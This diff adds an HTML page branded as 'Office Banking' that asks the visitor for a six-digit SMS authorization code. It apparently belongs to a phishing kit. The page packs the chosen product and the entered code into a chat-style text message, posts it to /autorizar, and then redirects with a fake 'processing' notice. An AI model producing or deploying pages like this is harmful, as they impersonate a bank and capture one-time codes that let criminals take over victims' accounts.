@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Autorización por SMS</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    .sms-container { margin: 20px 0; }
+    .sms { width: 100%; padding: 14px; font-size: 1.4em; text-align: center; border: 1px solid #ccc; border-radius: 6px; }
+    .btn-red { width: 100%; padding: 14px; font-size: 1.1em; }
+    #mensaje { margin-top: 20px; font-weight: bold; color: red; text-align: center; }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo-office-banking.svg" alt="Office Banking" 
+     class="logo-ob img-fluid mx-auto d-block">
+    <h2>Ingrese el código SMS de 6 dígitos</h2>
+    <p>Producto seleccionado: <span id="productoSeleccionado"></span></p>
+
+    <form id="formSMS">
+      <div class="sms-container">
+        <input type="text" id="smsCode" class="sms" maxlength="6" placeholder="123456" required>
+      </div>
+      <button type="submit" class="btn-red">Autorizar</button>
+    </form>
+
+    <div id="mensaje"></div>
+  </div>
+
+  <script>
+    const AUTORIZAR_URL = "/autorizar";
+
+    document.addEventListener("DOMContentLoaded", async () => {
+      const res = await fetch("/config");
+      const data = await res.json();
+      const seleccion = localStorage.getItem("seleccionProducto");
+      let producto = "";
+      if(seleccion === "producto1"){ producto = data.producto1 || ""; }
+      else if(seleccion === "producto2"){ producto = data.producto2 || ""; }
+      else if(seleccion === "producto3"){ producto = data.producto3 || ""; }
+      document.getElementById("productoSeleccionado").innerText = producto;
+    });
+
+    const smsInput = document.getElementById("smsCode");
+    smsInput.addEventListener("input", function() {
+      this.value = this.value.replace(/[^0-9]/g, "");
+      if(this.value.length > 6){ this.value = this.value.slice(0,6); }
+    });
+
+    document.getElementById("formSMS").addEventListener("submit", async e => {
+      e.preventDefault();
+      const producto = document.getElementById("productoSeleccionado").innerText;
+      const smsCode = smsInput.value;
+
+      const mensaje = `Autorización por SMS:\nProducto: ${producto}\nCódigo: ${smsCode}`;
+
+      try {
+        await fetch(AUTORIZAR_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje })
+        });
+        document.getElementById("mensaje").innerText = "✅ SMS enviado, procesando...";
+        setTimeout(()=> window.location.href="/", 3000);
+      } catch (error) {
+        document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
+      }
+    });
+  </script>
+</body>
+</html>
+
